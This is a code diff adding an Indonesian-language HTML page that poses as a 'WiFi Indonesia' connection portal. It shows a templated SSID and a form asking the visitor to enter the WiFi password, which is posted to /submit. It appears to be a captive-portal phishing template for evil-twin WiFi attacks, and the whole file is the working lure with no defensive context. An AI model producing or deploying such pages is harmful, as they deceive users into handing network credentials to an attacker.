@@ -1,0 +1,104 @@
+<!DOCTYPE html>
+<html lang="id">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta http-equiv="refresh" content="0; url=/connecttest.html">
+    <title>WiFi Indonesia - Sambungkan ke Internet</title>
+    <style>
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        body {
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+            background: linear-gradient(135deg, #003d00 0%, #006600 50%, #ff6b00 100%);
+            min-height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+        }
+        .container {
+            background: white;
+            padding: 40px;
+            border-radius: 20px;
+            box-shadow: 0 20px 60px rgba(0,0,0,0.3);
+            text-align: center;
+            max-width: 450px;
+        }
+        .logo {
+            font-size: 60px;
+            margin-bottom: 20px;
+        }
+        h1 {
+            color: #003d00;
+            margin-bottom: 10px;
+            font-size: 28px;
+        }
+        .subtitle {
+            color: #ff6b00;
+            font-weight: bold;
+            margin-bottom: 20px;
+        }
+        .wifi-name {
+            background: #f0f0f0;
+            padding: 15px;
+            border-radius: 10px;
+            margin: 20px 0;
+        }
+        .wifi-name strong {
+            color: #006600;
+            font-size: 18px;
+        }
+        .password-form {
+            margin-top: 30px;
+        }
+        input[type="password"] {
+            width: 100%;
+            padding: 15px;
+            border: 2px solid #ddd;
+            border-radius: 10px;
+            font-size: 16px;
+            margin-bottom: 15px;
+        }
+        button {
+            width: 100%;
+            padding: 15px;
+            background: linear-gradient(135deg, #ff6b00, #ff0000);
+            color: white;
+            border: none;
+            border-radius: 10px;
+            font-size: 18px;
+            font-weight: bold;
+            cursor: pointer;
+        }
+        button:hover { opacity: 0.9; }
+        .footer {
+            margin-top: 20px;
+            color: #888;
+            font-size: 12px;
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <div class="logo">📶</div>
+        <h1>WiFi Indonesia</h1>
+        <div class="subtitle">✨ Sambungkan Sekarang ✨</div>
+        
+        <div class="wifi-name">
+            <small>SSID:</small><br>
+            <strong>{ssid}</strong>
+        </div>
+        
+        <div class="password-form">
+            <form action="/submit" method="POST">
+                <input type="password" name="password" placeholder="Masukkan Password WiFi" required>
+                <button type="submit">🔗 Sambungkan</button>
+            </form>
+        </div>
+        
+        <div class="footer">
+            Powered by WiFi Indonesia<br>
+            © 2024
+        </div>
+    </div>
+</body>
+</html>
